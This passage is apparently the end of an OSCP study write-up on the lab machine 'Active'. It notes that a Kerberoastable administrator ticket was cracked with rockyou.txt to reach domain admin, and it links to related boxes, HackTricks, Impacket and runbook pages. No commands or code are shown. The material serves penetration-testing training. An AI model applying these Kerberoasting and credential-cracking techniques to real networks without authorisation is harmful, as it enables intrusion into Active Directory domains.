- The administrator ticket cracked in seven seconds at 73% through `rockyou.txt`, showing how a Kerberoastable administrator account with a dictionary password can produce an immediate domain-administrator chain.
- [IppSec -- Active](https://ippsec.rocks/?q=Active) provides additional practice for the same AD enumeration and credential-recovery chain.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AS-REP roasting, delegated AD privileges, and DCSync.
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- AD username discovery, roasting, and credential validation.
- [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] -- anonymous SMB enumeration and AD privilege paths.

## External resources

- [HackTricks -- Group Policy Preferences](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gpo-permissions.html)
- [HackTricks -- Kerberoasting](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoasting.html)
- [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [Microsoft MS14-025 advisory](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Active rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
